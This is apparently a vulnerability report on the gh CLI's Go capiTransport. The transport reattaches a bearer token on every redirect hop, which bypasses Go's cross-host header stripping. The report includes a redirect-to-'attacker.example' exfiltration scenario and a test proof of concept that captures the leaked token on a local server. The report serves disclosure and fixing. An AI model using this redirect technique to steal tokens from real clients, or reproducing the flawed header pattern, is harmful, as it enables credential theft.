### Title
Bearer token unconditionally reattached on every redirect hop, bypassing Go's cross-host Authorization-stripping protection - ([File: pkg/cmd/agent-task/capi/client.go])

### Summary
`(*capiTransport).RoundTrip` unconditionally sets the `Authorization: Bearer <token>` header on every request it processes, without checking the destination host. Because `http.Client` invokes the configured `Transport.RoundTrip` for every hop of a redirect chain (not just the initial request), a CAPI or GitHub API response containing a 3xx redirect to an attacker-controlled host will cause the token to be re-attached to the redirected request, even though Go's standard library would otherwise strip the `Authorization` header on cross-host redirects.

### Finding Description
`NewCAPIClient` wraps the caller-supplied `http.Client`'s transport with `capiTransport`, whose `RoundTrip` implementation is: [1](#0-0) 

```go
func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)
	...
	return ct.rp.RoundTrip(req)
}
```

The token is set unconditionally, with the only host check being for the `Copilot-Integration-Id` / `X-GitHub-Api-Version` headers, which are gated on `req.URL.Host == ct.capiHost`. `Authorization` is not gated on host at all.

`http.Client.Do` (which is used by all CAPI calls, e.g. `GetSessionLogs`, `GetSession`, `ListLatestSessionsForViewer`, `ListSessionsByResourceID`) internally loops on redirects: for each 3xx response it constructs a new `Request` object for the `Location` target and invokes the client's `Transport.RoundTrip` again for that new request. Go's standard library does have built-in protection (`net/http/client.go`'s header-copier logic) that omits sensitive headers, including `Authorization`, when the redirect target host differs from the original — but that protection only prevents the *previous* request's headers from being *copied forward* into the new request. It does not prevent a custom `Transport`/`RoundTripper` from *independently re-adding* the header when `RoundTrip` is invoked again for the new (post-redirect) request.

Since `capiTransport.RoundTrip` re-sets `Authorization` on every request it sees — regardless of whether that request is the original one or a redirect target — it defeats Go's cross-host header-stripping mitigation entirely. A malicious or compromised CAPI/GitHub host response (e.g., to `GetSessionLogs`, which hits `capiBaseURL + /agents/sessions/{id}/logs`) can respond with `302 Location: https://attacker.example/...`, and the outgoing request to `attacker.example` will carry the victim's live Copilot/GitHub bearer token in the `Authorization` header. [2](#0-1) 

None of `safeurl.JoinPathWithHostPrefix` (used only to construct the initial request URL) or any other allowlist logic in this file constrains where `http.Client` may follow a redirect to, and there is no `CheckRedirect` policy set on the `http.Client` to restrict cross-host redirects.

### Impact Explanation
This is credential/token exfiltration: an attacker who controls or compromises a response from the host `gh` points at for CAPI/session/job endpoints can cause the victim's live bearer token to be sent to an attacker-controlled server via a same-origin-appearing 3xx redirect. This maps to GitHub's bounty impact class of leakage of sensitive credentials to an unauthorized party.

### Likelihood Explanation
Exploitability requires the attacker to control (or man-in-the-middle-free, per the constraints, only control the *response content* of) a CAPI or GitHub API endpoint the victim's `gh` client legitimately calls, and have it issue a 3xx to a different host. Per the threat model, "attacker controls a CAPI or GitHub API response" is a stated precondition for this question, so this is scoped to a scenario where an attacker-influenced backend response (e.g., a compromised/malicious enterprise host configuration or a spoofed session logs response for `GetSessionLogs`) returns a redirect. This is not exploitable purely from repo/PR/gist content by an unprivileged GitHub user, since the client only talks to `capiBaseURL`/`c.host`, not to attacker-supplied URLs — the realistic path is a malicious/compromised custom GHES/CAPI host the victim has configured `gh` to use.

### Recommendation
In `(*capiTransport).RoundTrip`, only attach the `Authorization` header (and other sensitive headers) when `req.URL.Host` matches an expected allowlist (`ct.capiHost` or the configured GitHub host), mirroring the existing check already used for `Copilot-Integration-Id`. Additionally, set an explicit `CheckRedirect` on the `http.Client` used by `CAPIClient` to refuse or strip credentials on cross-host redirects, rather than relying on transport-level header injection that re-fires on every hop.

### Proof of Concept
```go
func TestCapiTransport_LeaksTokenOnCrossHostRedirect(t *testing.T) {
	var attackerAuthHeader string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		attackerAuthHeader = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
	}))
	defer attacker.Close()

	capi := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, attacker.URL+"/steal", http.StatusFound)
	}))
	defer capi.Close()

	httpClient := &http.Client{}
	c := NewCAPIClient(httpClient, "super-secret-token", "github.com", capi.URL)

	_, _ = c.GetSessionLogs(context.Background(), "1")

	if attackerAuthHeader != "" {
		t.Fatalf("expected Authorization header not to be sent to attacker host, got %q", attackerAuthHeader)
	}
}
```
Expected (buggy) result: `attackerAuthHeader` will equal `"Bearer super-secret-token"`, demonstrating the token was sent to the attacker-controlled host despite the cross-host redirect.

```go
func (ct *capiTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	req.Header.Set("Authorization", "Bearer "+ct.token)

	// Since this RoundTrip is reused for both Copilot API and
	// GitHub API requests, we conditionally add the integration
	// ID only when performing requests to the Copilot API.
	if req.URL.Host == ct.capiHost {
		req.Header.Add("Copilot-Integration-Id", "copilot-4-cli")

		// Ensure we are not using GitHub API versions while targeting CAPI.
		req.Header.Set("X-GitHub-Api-Version", "2026-01-09")
	}
	return ct.rp.RoundTrip(req)
}
```

```go
func (c *CAPIClient) GetSessionLogs(ctx context.Context, id string) ([]byte, error) {
	if id == "" {
		return nil, fmt.Errorf("missing session ID")
	}

	u, err := safeurl.JoinPathWithHostPrefix(c.capiBaseURL, "agents", "sessions", id, "logs")
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), http.NoBody)
	if err != nil {
		return nil, err
	}

	res, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
```
